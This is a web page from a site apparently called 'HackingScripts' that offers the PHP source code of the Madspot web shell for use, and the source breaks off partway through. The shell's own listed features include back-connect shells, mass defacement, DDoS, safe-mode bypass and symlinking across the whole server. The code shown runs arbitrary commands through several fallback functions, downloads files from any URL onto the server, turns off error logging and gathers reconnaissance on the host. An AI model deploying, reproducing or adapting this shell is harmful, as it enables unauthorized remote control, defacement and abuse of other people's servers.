<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> Madspot shell script </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>Madspot shell script</h2>
<p class="meta">31 Mar 2014</p>

<p>Madspot shell script. From the Madspot Security Team (madspot.net), or was the author Ikram Ali, as the script says?. You can find the Madspot Security Team website at pcbots.org.</p>

<p>The Madspot shell is written in PHP, runs on both Linux and Windows serves, and provides the following features:</p>

<ul>
<li>Process List</li>
<li>Eval</li>
<li>SQL Command Panel</li>
<li>Hash Genration</li>
<li>Perl and PHP Back Connect</li>
<li>Zone-h mass defacer</li>
<li>Powerful DDOS tool from server</li>
<li>Auto Safe mode Off (priv8)</li>
<li>Whole Server Auto Symlink (Priva8 Coded)</li>
<li>Perl 500 Internal Error Bypass</li>
<li>Killcode (Delete Shell)</li>
</ul>

<h3>Madspot shell source code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">&amp;lt;?php</span>

<span class="x">    /**</span>
<span class="x">     * @author Ikram ALI</span>
<span class="x">     * @copyright 2012</span>
<span class="x">     */</span>
<span class="x">    @define(&#39;VERSION&#39;,&#39;1.0&#39;);</span>
<span class="x">    @error_reporting(E_ALL ^ E_NOTICE);</span>
<span class="x">    @session_start();</span>
<span class="x">    @ini_set(&#39;error_log&#39;,NULL);</span>
<span class="x">    @ini_set(&#39;log_errors&#39;,0);</span>
<span class="x">    @ini_set(&#39;max_execution_time&#39;,0);</span>
<span class="x">    @set_time_limit(0);</span>
<span class="x">    @set_magic_quotes_runtime(0);</span>

<span class="x">    if(get_magic_quotes_gpc()) {</span>
<span class="x">            function madstripslashes($array) {</span>
<span class="x">                    return is_array($array) ? array_map(&#39;madstripslashes&#39;, $array) : stripslashes($array);</span>
<span class="x">            }</span>
<span class="x">            $_POST = madstripslashes($_POST);</span>
<span class="x">    }</span>
<span class="x">    $default_action = &#39;FilesMan&#39;;</span>
<span class="x">    $default_use_ajax = true;</span>
<span class="x">    $default_charset = &#39;Windows-1251&#39;;</span>
<span class="x">    if (strtolower(substr(PHP_OS,0,3))==&quot;win&quot;)</span>
<span class="x">        $sys=&#39;win&#39;;</span>
<span class="x">     else</span>
<span class="x">        $sys=&#39;unix&#39;;</span>

<span class="x">    $home_cwd = @getcwd();</span>
<span class="x">    if(isset($_POST[&#39;c&#39;]))</span>
<span class="x">            @chdir($_POST[&#39;c&#39;]);  </span>

<span class="x">    $cwd = @getcwd();</span>
<span class="x">    if($sys == &#39;win&#39;)</span>
<span class="x">    {</span>
<span class="x">        $home_cwd = str_replace(&quot;\\&quot;, &quot;/&quot;, $home_cwd);</span>
<span class="x">            $cwd = str_replace(&quot;\\&quot;, &quot;/&quot;, $cwd);</span>
<span class="x">    }</span>

<span class="x">    if($cwd[strlen($cwd)-1] != &#39;/&#39; )</span>
<span class="x">            $cwd .= &#39;/&#39;;</span>


<span class="x">    function madEx($in) {</span>
<span class="x">            $out = &#39;&#39;;</span>
<span class="x">            if (function_exists(&#39;exec&#39;)) {</span>
<span class="x">                    @exec($in,$out);</span>
<span class="x">                    $out = @join(&quot;\n&quot;,$out);</span>
<span class="x">            } elseif (function_exists(&#39;passthru&#39;)) {</span>
<span class="x">                    ob_start();</span>
<span class="x">                    @passthru($in);</span>
<span class="x">                    $out = ob_get_clean();</span>
<span class="x">            } elseif (function_exists(&#39;system&#39;)) {</span>
<span class="x">                    ob_start();</span>
<span class="x">                    @system($in);</span>
<span class="x">                    $out = ob_get_clean();</span>
<span class="x">            } elseif (function_exists(&#39;shell_exec&#39;)) {</span>
<span class="x">                    $out = shell_exec($in);</span>
<span class="x">            } elseif (is_resource($f = @popen($in,&quot;r&quot;))) {</span>
<span class="x">                    $out = &quot;&quot;;</span>
<span class="x">                    while(!@feof($f))</span>
<span class="x">                            $out .= fread($f,1024);</span>
<span class="x">                    pclose($f);</span>
<span class="x">            }</span>
<span class="x">            return $out;</span>
<span class="x">    }</span>
<span class="x">    $down=@getcwd();</span>
<span class="x">    if($sys==&quot;win&quot;)</span>
<span class="x">    $down.=&#39;\\&#39;;</span>
<span class="x">    else</span>
<span class="x">    $down.=&#39;/&#39;;</span>
<span class="x">    if(isset($_POST[&#39;rtdown&#39;]))</span>
<span class="x">    {</span>
<span class="x">    $url = $_POST[&#39;rtdown&#39;];</span>
<span class="x">    $newfname = $down. basename($url);</span>
<span class="x">    $file = fopen ($url, &quot;rb&quot;);</span>
<span class="x">    if ($file) {</span>
<span class="x">      $newf = fopen ($newfname, &quot;wb&quot;);</span>
<span class="x">      if ($newf)</span>
<span class="x">      while(!feof($file)) {</span>
<span class="x">        fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );</span>
<span class="x">      }</span>
<span class="x">      }</span>

<span class="x">    if ($file) {</span>
<span class="x">      fclose($file);</span>
<span class="x">    }</span>
<span class="x">    if ($newf) {</span>
<span class="x">      fclose($newf);</span>
<span class="x">    }</span>
<span class="x">    }</span>



<span class="x">     function madhead()</span>
<span class="x">     {</span>
<span class="x">        if(empty($_POST[&#39;charset&#39;]))</span>
<span class="x">                    $_POST[&#39;charset&#39;] = $GLOBALS[&#39;default_charset&#39;];</span>

<span class="x">    $freeSpace = @diskfreespace($GLOBALS[&#39;cwd&#39;]);</span>
<span class="x">    $totalSpace = @disk_total_space($GLOBALS[&#39;cwd&#39;]);</span>
<span class="x">    $totalSpace = $totalSpace?$totalSpace:1;</span>

<span class="x">    $on=&quot;&amp;lt;font color=#0F0&amp;gt; ON &amp;lt;/font&amp;gt;&quot;;</span>
<span class="x">    $of=&quot;&amp;lt;font color=red&amp;gt; OFF &amp;lt;/font&amp;gt;&quot;;</span>
<span class="x">    $none=&quot;&amp;lt;font color=#0F0&amp;gt; NONE &amp;lt;/font&amp;gt;&quot;;  </span>
<span class="x">    if(function_exists(&#39;curl_version&#39;))</span>
<span class="x">        $curl=$on;</span>
<span class="x">    else</span>
<span class="x">        $curl=$of;</span>
<span class="x">    if(function_exists(&#39;mysql_get_client_info&#39;))</span>
<span class="x">        $mysql=$on;</span>
<span class="x">     else</span>
<span class="x">        $mysql=$of;</span>
<span class="x">    if(function_exists(&#39;mssql_connect&#39;))</span>
<span class="x">        $mssql=$on;</span>
<span class="x">    else</span>
<span class="x">       $mssql=$of;</span>

<span class="x">    if(function_exists(&#39;pg_connect&#39;))</span>
<span class="x">        $pg=$on;</span>
<span class="x">    else</span>
<span class="x">       $pg=$of;</span>
<span class="x">    if(function_exists(&#39;oci_connect&#39;))</span>
<span class="x">       $or=$on;</span>
<span class="x">    else</span>
<span class="x">       $or=$of;</span>
<span class="x">    if(@ini_get(&#39;disable_functions&#39;))</span>
<span class="x">      $disfun=@ini_get(&#39;disable_functions&#39;);</span>
<span class="x">    else</span>
<span class="x">    $disfun=&quot;All Functions Enable&quot;;</span>
<span class="x">    if(@ini_get(&#39;safe_mode&#39;))</span>
<span class="x">    $safe_modes=&quot;&amp;lt;font color=red&amp;gt;ON&amp;lt;/font&amp;gt;&quot;;</span>
<span class="x">    else</span>
<span class="x">    $safe_modes=&quot;&amp;lt;font color=#0F0 &amp;gt;OFF&amp;lt;/font&amp;gt;&quot;;</span>
<span class="x">    if(@ini_get(&#39;open_basedir&#39;))</span>
<span class="x">    $open_b=@ini_get(&#39;open_basedir&#39;);</span>
<span class="x">        else</span>
<span class="x">      $open_b=$none;</span>


<span class="x">    if(@ini_get(&#39;safe_mode_exec_dir&#39;))</span>
<span class="x">    $safe_exe=@ini_get(&#39;safe_mode_exec_dir&#39;);</span>
<span class="x">        else</span>
<span class="x">    $safe_exe=$none;</span>
<span class="x">    if(@ini_get(&#39;safe_mode_include_dir&#39;))</span>
<span class="x">       $safe_include=@ini_get(&#39;safe_mode_include_dir&#39;);</span>
<span class="x">    else</span>
<span class="x">     $safe_include=$none;</span>
<span class="x">    if(!function_exists(&#39;posix_getegid&#39;))</span>
<span class="x">    {</span>
<span class="x">                    $user = @get_current_user();</span>
<span class="x">                    $uid = @getmyuid();</span>
<span class="x">                    $gid = @getmygid();</span>
<span class="x">                    $group = &quot;?&quot;;</span>
<span class="x">    } else</span>
<span class="x">    {</span>
<span class="x">                    $uid = @posix_getpwuid(posix_geteuid());</span>
<span class="x">                    $gid = @posix_getgrgid(posix_getegid());</span>
<span class="x">                    $user = $uid[&#39;name&#39;];</span>
<span class="x">                    $uid = $uid[&#39;uid&#39;];</span>
<span class="x">                    $group = $gid[&#39;name&#39;];</span>
<span class="x">                    $gid = $gid[&#39;gid&#39;];</span>
<span class="x">            }</span>


<span class="x">         $cwd_links = &#39;&#39;;</span>
<span class="x">            $path = explode(&quot;/&quot;, $GLOBALS[&#39;cwd&#39;]);</span>
<span class="x">            $n=count($path);</span>
<span class="x">            for($i=0; $i&amp;lt;$n-1; $i++) {</span>
<span class="x">                    $cwd_links .= &quot;&amp;lt;a  href=&#39;#&#39; onclick=&#39;g(\&quot;FilesMan\&quot;,\&quot;&quot;;</span>
<span class="x">                    for($j=0; $j&amp;lt;=$i; $j++)</span>
<span class="x">                            $cwd_links .= $path[$j].&#39;/&#39;;</span>
<span class="x">                    $cwd_links .= &quot;\&quot;)&#39;&amp;gt;&quot;.$path[$i].&quot;/&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">            }</span>

<span class="x">    $drives = &quot;&quot;;</span>
<span class="x">    foreach(range(&#39;c&#39;,&#39;z&#39;) as $drive)</span>
<span class="x">    if(is_dir($drive.&#39;:\\&#39;))</span>
<span class="x">    $drives .= &#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;.$drive.&#39;:/\&#39;)&quot;&amp;gt;[ &#39;.$drive.&#39; ]&amp;lt;/a&amp;gt; &#39;;</span>





<span class="x">     echo &#39;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;</span>
<span class="x">    &amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;</span>
<span class="x">    &amp;lt;head&amp;gt;</span>
<span class="x">    &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&amp;gt;</span>
<span class="x">    &amp;lt;link href=&quot;http://www.madspot.net/favicon.ico&quot; rel=&quot;icon&quot; type=&quot;image/x-icon&quot;/&amp;gt;</span>
<span class="x">    &amp;lt;title&amp;gt;Madspot Security Team Shell&amp;lt;/title&amp;gt;</span>
<span class="x">    &amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
<span class="x">    &amp;lt;!--</span>
<span class="x">    .whole {</span>
<span class="x">            background-color: #CCC;</span>
<span class="x">            height:auto;</span>
<span class="x">            width: auto;</span>
<span class="x">            margin-top: 10px;</span>
<span class="x">            margin-right: 10px;</span>
<span class="x">            margin-left: 10px;</span>
<span class="x">    }</span>
<span class="x">    .header {</span>
<span class="x">            height: auto;</span>
<span class="x">            width: auto;</span>
<span class="x">            border: 7px solid #CCC;</span>
<span class="x">            color: #999;</span>
<span class="x">            font-size: 12px;</span>
<span class="x">            font-family: Verdana, Geneva, sans-serif;</span>
<span class="x">            background-color: #000;</span>
<span class="x">    }</span>
<span class="x">    .header a {color:#0F0; text-decoration:none;}</span>
<span class="x">    span {</span>
<span class="x">            font-weight: bolder;</span>
<span class="x">            color: #FFF;</span>
<span class="x">    }</span>
<span class="x">    #meunlist {</span>
<span class="x">            font-family: Verdana, Geneva, sans-serif;</span>
<span class="x">            color: #FFF;</span>
<span class="x">            background-color: #000;</span>
<span class="x">            width: auto;</span>
<span class="x">            border-right-width: 7px;</span>
<span class="x">            border-left-width: 7px;</span>
<span class="x">            border-top-style: solid;</span>
<span class="x">            border-right-style: solid;</span>
<span class="x">            border-bottom-style: solid;</span>
<span class="x">            border-left-style: solid;</span>
<span class="x">            border-top-color: #CCC;</span>
<span class="x">            border-right-color: #CCC;</span>
<span class="x">            border-bottom-color: #CCC;</span>
<span class="x">            border-left-color: #CCC;</span>
<span class="x">            height: auto;</span>
<span class="x">            font-size: 12px;</span>
<span class="x">            font-weight: bold;</span>
<span class="x">            border-top-width: 0px;</span>
<span class="x">    }</span>
<span class="x">     .whole #meunlist ul {</span>
<span class="x">            padding-top: 5px;</span>
<span class="x">            padding-right: 5px;</span>
<span class="x">            padding-bottom: 7px;</span>
<span class="x">            padding-left: 2px;</span>
<span class="x">            text-align:center;</span>
<span class="x">            list-style-type: none;</span>
<span class="x">            margin: 0px;</span>
<span class="x">    }</span>
<span class="x">     .whole #meunlist li {</span>
<span class="x">            margin: 0px;</span>
<span class="x">            padding: 0px;</span>
<span class="x">            display: inline;</span>
<span class="x">    }</span>
<span class="x">     .whole #meunlist a {</span>
<span class="x">       font-family: arial, sans-serif;</span>
<span class="x">            font-size: 14px;</span>
<span class="x">            text-decoration:none;</span>
<span class="x">            font-weight: bold;</span>
<span class="x">            color: #fff;</span>
<span class="x">            clear: both;</span>
<span class="x">            width: 100px;</span>
<span class="x">            margin-right: -6px;</span>
<span class="x">            padding-top: 3px;</span>
<span class="x">            padding-right: 15px;</span>
<span class="x">            padding-bottom: 3px;</span>
<span class="x">            padding-left: 15px;</span>
<span class="x">            border-right-width: 1px;</span>
<span class="x">            border-right-style: solid;</span>
<span class="x">            border-right-color: #FFF;</span>
<span class="x">    }</span>
<span class="x">     .whole #meunlist a:hover {</span>
<span class="x">            color: #000;</span>
<span class="x">            background: #fff;</span>
<span class="x">    }</span>

<span class="x">    .foot {</span>
<span class="x">            font-family: Verdana, Geneva, sans-serif;</span>
<span class="x">            background-color: #000;</span>
<span class="x">            margin: 0px;</span>
<span class="x">            padding: 0px;</span>
<span class="x">            width: 100%;</span>
<span class="x">            text-align: center;</span>
<span class="x">            font-size: 12px;</span>
<span class="x">            color: #CCC;</span>
<span class="x">            border-right-width: 7px;</span>
<span class="x">            border-left-width: 7px;</span>
<span class="x">       border-bottom-width: 7px;</span>
<span class="x">       border-bottom-style: solid;</span>
<span class="x">       border-right-style: solid;</span>
<span class="x">       border-right-style: solid;</span>
<span class="x">            border-left-style: solid;</span>
<span class="x">            border-top-color: #CCC;</span>
<span class="x">            border-right-color: #CCC;</span>
<span class="x">            border-bottom-color: #CCC;</span>
<span class="x">            border-left-color: #CCC;</span>
<span class="x">    }&#39;;</span>
<span class="x">    if(is_writable($GLOBALS[&#39;cwd&#39;]))</span>
<span class="x">     {</span>
<span class="x">        echo &quot;.foottable {</span>
<span class="x">       width: 300px;</span>
<span class="x">       font-weight: bold;</span>
<span class="x">       }&quot;;}</span>
<span class="x">        else</span>
<span class="x">        {</span>
<span class="x">           echo &quot;.foottable {</span>
<span class="x">       width: 300px;</span>
<span class="x">       font-weight: bold;</span>
<span class="x">       background-color:red;</span>
<span class="x">       }</span>
<span class="x">       .dir {</span>
<span class="x">         background-color:red;  </span>
<span class="x">       }</span>
<span class="x">       &quot;;</span>
<span class="x">        }</span>
<span class="x">     echo &#39;.main th{text-align:left;}</span>
<span class="x">    .main a{color: #FFF;}</span>
<span class="x">    .main tr:hover{background-color:red;}</span>
<span class="x">    .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }</span>
<span class="x">    .bigarea{ width:99%; height:300px; }  </span>
<span class="x">     &amp;lt;/style&amp;gt;</span>

<span class="x">    &#39;;</span>

<span class="x">    echo &quot;&amp;lt;script&amp;gt;</span>
<span class="x">       var c_ = &#39;&quot; . htmlspecialchars($GLOBALS[&#39;cwd&#39;]) . &quot;&#39;;</span>
<span class="x">       var a_ = &#39;&quot; . htmlspecialchars(@$_POST[&#39;a&#39;]) .&quot;&#39;</span>
<span class="x">       var charset_ = &#39;&quot; . htmlspecialchars(@$_POST[&#39;charset&#39;]) .&quot;&#39;;</span>
<span class="x">       var p1_ = &#39;&quot; . ((strpos(@$_POST[&#39;p1&#39;],&quot;\n&quot;)!==false)?&#39;&#39;:htmlspecialchars($_POST[&#39;p1&#39;],ENT_QUOTES)) .&quot;&#39;;</span>
<span class="x">       var p2_ = &#39;&quot; . ((strpos(@$_POST[&#39;p2&#39;],&quot;\n&quot;)!==false)?&#39;&#39;:htmlspecialchars($_POST[&#39;p2&#39;],ENT_QUOTES)) .&quot;&#39;;</span>
<span class="x">       var p3_ = &#39;&quot; . ((strpos(@$_POST[&#39;p3&#39;],&quot;\n&quot;)!==false)?&#39;&#39;:htmlspecialchars($_POST[&#39;p3&#39;],ENT_QUOTES)) .&quot;&#39;;</span>
<span class="x">       var d = document;</span>
<span class="x">            function set(a,c,p1,p2,p3,charset) {</span>
<span class="x">                    if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;</span>
<span class="x">                    if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;</span>
<span class="x">                    if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;</span>
<span class="x">                    if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;</span>
<span class="x">                    if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;</span>
<span class="x">                    if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;</span>
<span class="x">            }</span>
<span class="x">            function g(a,c,p1,p2,p3,charset) {</span>
<span class="x">                    set(a,c,p1,p2,p3,charset);</span>
<span class="x">                    d.mf.submit();</span>
<span class="x">            }&amp;lt;/script&amp;gt;&quot;;</span>


<span class="x">            echo &#39;</span>
<span class="x">    &amp;lt;/head&amp;gt;</span>

<span class="x">    &amp;lt;body bgcolor=&quot;#000000&quot;  leftmargin=&quot;0&quot; topmargin=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot;&amp;gt;</span>
<span class="x">    &amp;lt;div class=&quot;whole&quot;&amp;gt;</span>
<span class="x">    &amp;lt;form method=post name=mf style=&quot;display:none;&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=a&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=c&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=p1&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=p2&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=p3&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=charset&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">     &amp;lt;div class=&quot;header&quot;&amp;gt;&amp;lt;table width=&quot;100%&quot; border=&quot;0&quot;  align=&quot;lift&quot;&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td width=&quot;3%&quot;&amp;gt;&amp;lt;span&amp;gt;Uname:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;.substr(@php_uname(), 0, 120).&#39;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;User:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&#39;. $uid . &#39; [ &#39; . $user . &#39; ] &amp;lt;span&amp;gt;   Group: &amp;lt;/span&amp;gt;&#39; . $gid . &#39; [ &#39; . $group . &#39; ] &amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td width=&quot;14%&quot; rowspan=&quot;8&quot;&amp;gt;&amp;lt;img alt=&quot;&quot; src=&quot;data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABEMDQ8NCxEPDg8TEhEVGiscGhgYGjUmKB8rPzdCQT43PDtFTmNURUleSzs8VnZXXmdqb3BvQ1N6g3lsgmNtb2sBEhMTGhcaMxwcM2tHPEdra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra2tra//AABEIAI8AjwMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AOOtLJrkFt21RWc6nKZVKigWv7I/6bfpWbr+Rh9aXYP7IH/Pb9KXt/If1lN7FmPw4zoGM4GexFZyxiXQtVvIjbw5cj7ssZ/MVSxcC/aozLq1ltJfLmXDV0wmpK6LjJPYYEAHznFUUG2P+8fyoAAsf94/lQBILbPQmgBGtZAMgZFAEBGDQBej0yWSMPuUZ5waydWKZjKvGLHf2TN/fSl7ZGf1qIDSZj0Zcmk68UNYmLZYHh27IzujH41DxcDT2qA+HbsAkNGfoaaxUGHtUZc8LwSGOQYYV0RkpK6NE7q5s6YALJCO5Oa5K3xHn4l+/Yt1kcw5OWUe9J7DjubHSuKWrOxJBUj9TG8RIn2dXKguCAD+Nehgm9Ua0jmZD+8b616JuMoAkh/1q0AXl60ATLQBQuwEujgdulAG7GMRIPYV58tWeTVfvMdSMyezANwuRWc72Lp7mnXIdYUkI5TxJ/yEB/uCvZw38NHTS+Esad/x5R/j/Osqvxs4cT8ZZrM5hyffX6ilL4So7mxXC9zsQUDMbxGR9njHqwr0MH1NaRzMn+sb616BuMoAkg/1q0AXkoAmWgCjff8AHz+AoA3Iv9Un+6K4JbnkVPiY6pMyxZf8fC/Q1nU2NaW5pVxnUFMDlfEv/IQX/cr18L/DOin8JPp3/HlH+P8AOs6vxs4cT8ZZrM5hyffX6ilL4So7mxXC9zsQUhmH4k+7CfevRwXU1pHOS/6xvrXoG4ygCSD/AFq0AXloAmWgCjff8fX4CgDbh5gj/wB0fyrglueRV+Jj6kzLFl/x8L9DWdTY1pbmlXGdQUwOV8S/8hBf9yvXwv8ADOin8JNpp/0JPx/nUVvjOHE/GWqyOYcn31+tTLYqO5sVxS3OxBS8gMTxH/qov94V6OD0ubUjm5f9Y31r0DcZQBJB/rVoAvLQBMtAFG+/4+vwFAG3B/qIv9wfyrgn8R5NX42PqbmRYsv+PgfQ1nU2NKe5pVxnWFMGcr4l/wCQgv8AuV6+F/hnRS+Egsr9bePy3UkDpirqU+Z3Iq0efUtjVLcjncD9Ky9jI5/qrvuH9p23q/5UewkP6q0y2niG3VAGVmI74xWLwkmaqk0B8SQdoXz9aPqT7j9kzJ1HUmvplYjai9BXXRoqmrGsI8pXkgLEspBB5zmtixnkP7fnQAqwurA8cUAWlYDqDQBIsi+hJFAFK6fM24/e747UAaFpqEIhVZGKlQB0rnnSu9Dkq4fmd0T/ANoW3/PT9Kz9jIy+rSHJqdujhll5HtSdCTQ44eSZcGvWmOSc+1YfVJGypyEfX7RUJXJPpTWDl1GqTuc7qN4b25MpGBjAFehThyRsbRVkT6baJNuklG5RwFzU1KjjojKtV5EXhYWo/wCWQ/OsPazOX6zIX7Ba/wDPIfmaPazD6zItwaJaPGHdMZ7A1hLFTTNlVkyT+wrL+4fzqfrcynUZlazpsVnGHjGATxXZQrOotTSnPmI7OxjaNXkUnIzTqVWtEZVa7i7ItfYbb/nl+prP2szD6zMBp9sTgRc/U0nWmkNYiTLy6FZ7RuU574NYvFTNlVkL/YVlj7rfnU/W5j9qzA1O0S1vBCowOPoa9ClPnhc2hLmVypLsDkKuBmtSxmR/doAVQGYALyaALK2yHrnNADzZIR8pOaAKUiGNyrdRQBr6R/x7t/vVy1/iOHF7ov1gcQGkxrc2I/8AVr9K4pbnZHYdUjMXxN/x5x/71d+C3ZrS3IrT/j1i/wB0VpP4mcVf42S1G5iSW/8Ar4/rUS2Lhua1cTOxbBRoLc5vxIP9LhNerg/gOilsYkn32+tdhqMoAlt/9Z+FAF1KAJloAoX/APx8H6CgDQ0j/j3b61y1/iOHFbov1gcQHpSY47mxH/q1+griludkdh1SUYvib/j0j/3q7sF8TNaW5Fa/8esX+6K1n8TOGv8AGS1BiSW/+vj+tTP4S4bmtXCdgUwOd8SY+0Qetepg/gZvS2MKT/WN9a7TUZSAlt/9Z+FAF1KAJloAo6gf3+PYUAaOlDFmD6k1yVviODFbou1icYdqTHHc2I/9Wv0riludsdh1IZi+Jv8Aj0j/AN6u3BfEzSluRWv/AB6xf7orWfxM4q/xktQYklv/AK+P61M/hLhua1cJ2BTA5zxJ/wAfMFepg/gZvS2MOT/WH612moykBLb/AOs/CgC6tAEy0AUL/wD4+PwFAGjpLg2xTup5rlrp3ucOKWqZerA4w7UnsC3NeLmJSPSuKe52R2H1JRi+Jv8Aj0jHfdXfgr3ZpS3IrT/j1i/3RWlT4mcVf42S1BiSW/EyE9M1Er8pcPiNauN6HWFIbOd8SD/SYT+Ferg17upvS2MKX/WN9a7DUZQBJAf3goAvLQBMtAFC/Obgj0AoAS0uWtpNyjcCMEVMoKSsROCmrMttq0naICsvYox+rRBdWk/ijU0ewiL6tEsx+IHiXasRx7ms3hIspUEuo/8A4SST/niKX1SPcr2SM/UNRe9PK4+prenTUFoaRikOtr6WJFXydwAwO2acqaZE6MZak/8AaT/8+x/Os/YLuZfVoiHVcHBgIP1o9ggWGSLC6/cAACDIHrWf1SLLVFDjr85Uj7Pg44NCwkd7j9kjJvLuW4lBcEAHIBrphBRVkaqKSA+XIN2xwSOgHFWMZ5Sf3X/KgBfLQdFf8qAJRIR2b/vmgBTcMqnAYf8AAaAKLsXYsepoABxzQAu9vWgBQzEgZoAuIigAEZPvQBKsaH+AUAQz26CRMcZI/nQBFcyN5rAHABwBQBB5jf3jQA5WdmA3HmgC4ijoRmgCVUQ9VoAjnQCIqRnaQVJ9D2oAqSyNvIz09KAI/Mb+8aAHxlncDcaALaovpQBKI0PBUc0AZ9zH5UzL27UAR9qAEoAdH99frQBfWgCZaAGXH+si+o/nQBQuf9e/1NAEVAD4f9Yv1oAvLQBMlADLn7j/APAf50AZsn+sP1oAbQBLb/6z8KALq0ASrQBR1D/j4z7CgCuaAEoAcn31+tAF9etAEy0AMuPvxfUfzoAoXP8Ar3+poAioAfD/AK1aALy0ATLQAy4+4/8AwH+dAGbJ99vrQA2gCWD/AFn4UAXVoAmWgCjqH+v/AAoArGgBKAHJ99frQBfWgCZaAGXH34vqP50AULn/AF7/AFNAEVAD4f8AWrQBfWgCVaAGXH3H/wCA/wA6AM2T77fWgBtAEsH+s/CgC6tAEy0AUdQP7/HsKAK3agBKAFU4YGgC+nIyOlAE6igCK5dVdMkfKRn86AKVxhpWYdCc5oAioAfGdrqaAL6e1AEqdaAI7gjy3O4DlR160AZ8oxIfrQAygCSEhZAT0oAvLQBKOBk8UAZ124knYr06UAQ0AGaAFBIoAcJXHRsUAL58v980AMZixyxzQAquV6UAO80/3V/KgA80/wB1fyoAUXDjpgUAL9pk9aAI3cucmgBwmYAAgHHqKADzT/dX8qADzT/dX8qAF+0P2wKAGtK7DBY4oAZQB//Z&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">     &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;PHP:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&#39;.@phpversion(). &#39;   &amp;lt;span&amp;gt;   Safe Mode:&#39;.$safe_modes.&#39;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;/tr&amp;gt;</span>
<span class="x">     &amp;lt;tr&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Our IP:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">       &amp;lt;td&amp;gt;&#39;.@$_SERVER[&quot;SERVER_ADDR&quot;].&#39;    &amp;lt;span&amp;gt;Server IP:&amp;lt;/span&amp;gt; &#39;.@$_SERVER[&quot;REMOTE_ADDR&quot;].&#39;&amp;lt;/td&amp;gt;</span>
